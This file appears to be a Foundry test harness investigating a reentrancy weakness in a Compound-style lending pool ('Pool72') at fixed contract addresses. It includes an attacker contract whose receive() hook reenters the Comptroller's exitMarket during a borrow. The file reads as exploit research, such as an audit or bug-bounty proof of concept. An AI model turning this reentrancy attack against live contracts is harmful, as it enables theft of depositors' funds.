// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAssetsIn(address) external view returns (address[] memory);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function repayBorrow() external payable;
}

/// @dev Test exitMarket normally works, then check if the issue is specific to reentrancy context
contract Pool72Test10 is Test {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testExitMarketNormalWorks() public {
        address user = address(0xBEEF);
        vm.deal(user, 100 ether);
        vm.startPrank(user);

        FETH72.mint{value: 10 ether}();
        address[] memory m = new address[](1);
        m[0] = address(FETH72);
        COMPTROLLER.enterMarkets(m);

        address[] memory assets = COMPTROLLER.getAssetsIn(user);
        console.log("Assets count:", assets.length);

        uint256 result = COMPTROLLER.exitMarket(address(FETH72));
        console.log("Exit result (no borrow):", result);

        FETH72.redeem(FETH72.balanceOf(user));
        vm.stopPrank();
    }

    // Key test: the exitMarket works normally. So the assert only fails during reentrancy.
    // The question: WHY does the loop fail to find the asset during reentrancy?
    // Hypothesis: the `_prepare()` call in the proxy changes something about storage access
    // OR the delegatecall context during reentrancy is different

    // New approach: Maybe the issue is that exitMarket is not being called as exitMarket
    // but as some other function due to selector collision or proxy dispatch issues

    // Let's try calling exitMarket with raw calldata during reentrancy
    function testReentrancyWithRawExitMarket() public {
        address payable user = payable(address(0xBEEF));
        vm.deal(user, 200 ether);
        vm.startPrank(user);
        RawExitMarketAttacker a = new RawExitMarketAttacker(user);
        a.attack{value: 150 ether}();
        // Cleanup
        FETH72.repayBorrow{value: FETH72.borrowBalanceStored(address(a))}();
        vm.stopPrank();
    }
}

contract RawExitMarketAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        FETH72.mint{value: msg.value}();
        address[] memory m = new address[](1);
        m[0] = address(FETH72);
        COMPTROLLER.enterMarkets(m);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(1 ether);
        borrowInFlight = false;
        console.log("Borrow:", result);
        console.log("Reentered:", reentered);

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        // Try calling exitMarket with low-level call to see what happens
        bytes memory callData = abi.encodeWithSignature("exitMarket(address)", address(FETH72));
        (bool success, bytes memory returnData) = address(COMPTROLLER).call(callData);
        console.log("exitMarket success:", success);
        console.log("exitMarket return length:", returnData.length);
        if (success && returnData.length >= 32) {
            uint256 code = abi.decode(returnData, (uint256));
            console.log("exitMarket return code:", code);
        }
        if (!success) {
            console.log("exitMarket FAILED");
            // Check gas remaining
            console.log("Gas remaining:", gasleft());
        }
    }
}
